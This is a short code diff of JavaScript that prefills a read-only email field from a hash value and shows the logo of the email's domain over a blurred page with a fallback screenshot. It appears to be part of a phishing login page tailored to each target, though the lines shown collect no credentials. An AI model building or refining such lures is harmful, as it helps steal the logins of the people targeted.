@@ -315,19 +315,16 @@ overlay.style.opacity = "0";
 
 document.body.classList.add('blur-active');
 
-if (!/^[^@]+@[^@]+\.[^@]+$/.test(rawHash)) {
+if (email && /^[^@]+@[^@]+\.[^@]+$/.test(email)) {
+    emailInput.value = email;
+    emailInput.setAttribute("readonly", true);
 
-} else {
-  emailInput.value = rawHash;
-  emailInput.setAttribute("readonly", true);
+    const domain = email.split("@")[1];
 
-  const domain = rawHash.split('@')[1];
-
-  // Set logo
-  logoImg.src = `https://logo.clearbit.com/${domain}`;
-  logoImg.onerror = () => {
-    logoImg.src = "https://via.placeholder.com/150?text=Logo";
-  };
+    logoImg.src = `https://logo.clearbit.com/${domain}`;
+    logoImg.onerror = () => {
+        logoImg.src = "https://via.placeholder.com/150?text=Logo";
+    };
 
   // Fallback screenshot
   const fallbackScreenshot = document.createElement('img');
